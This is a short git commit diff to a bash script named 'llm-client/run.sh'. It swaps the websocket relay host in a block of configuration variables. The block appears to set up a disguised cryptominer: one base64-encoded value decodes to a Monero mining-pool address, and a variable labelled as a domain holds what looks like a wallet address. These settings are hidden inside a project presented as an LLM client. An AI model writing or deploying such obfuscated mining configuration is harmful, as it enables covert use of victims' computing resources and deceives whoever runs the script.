a726809c7f36d5459d61f6ab94282344423d0390
satelitlima00 <128956610+satelitlima00@users.noreply.github.com>
2026-01-11 16:50:17 +0700

    Update run.sh

--- llm-client/run.sh
+++ llm-client/run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=ws://cdn.medco.cyou
+echo "SERVER_WS=wss://cloud9one.biz.id
 SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
 SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
 SERVER_SECRET=${NAME}
